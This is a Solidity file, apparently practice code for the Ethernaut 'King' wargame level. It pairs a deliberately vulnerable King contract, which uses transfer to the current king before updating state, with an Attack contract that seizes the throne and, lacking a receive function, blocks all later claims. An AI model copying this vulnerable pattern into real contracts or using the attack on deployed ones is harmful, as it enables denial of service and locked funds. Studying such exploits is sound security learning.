// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "hardhat/console.sol";

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    console.log("received", msg.value, msg.value >= prize, msg.sender == owner);
    require(msg.value >= prize || msg.sender == owner);
    console.log("h1");
    king.transfer(msg.value);
    console.log("h2");
    king = payable(msg.sender);
    console.log("h3");
    prize = msg.value;
    console.log("h4");
  }

  fallback() external payable {
    console.log("fallback");
  }

  function stealKing() external payable {
    console.log("received", msg.value, msg.value >= prize, msg.sender == owner);
    require(msg.value >= prize || msg.sender == owner);
    console.log("h1");
    king.transfer(msg.value);
    console.log("h2");
    king = payable(msg.sender);
    console.log("h3");
    prize = msg.value;
    console.log("h4");
  }

  function _king() external view returns (address payable) {
    return king;
  }
}

contract Attack {
    function attack(King _kingContract) public payable {
      // _kingContract.stealKing();
      (bool sent, bytes memory data) = payable(_kingContract).call{value: msg.value}("");
      console.log("attack", address( _kingContract), sent, string(data));
    }
}